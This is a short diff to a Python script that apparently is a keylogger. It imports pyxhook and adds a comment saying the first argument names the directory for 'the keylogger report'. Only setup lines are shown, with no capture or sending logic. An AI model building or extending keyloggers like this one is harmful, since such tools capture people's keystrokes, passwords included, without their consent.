@@ -4,7 +4,7 @@ import datetime
 import pyxhook
 import time
 import threading
-
+#The argument is the path of the directory you will find the keylogger report
 path=sys.argv[1]
 date=datetime.datetime.now()
 day=datetime.datetime.today()
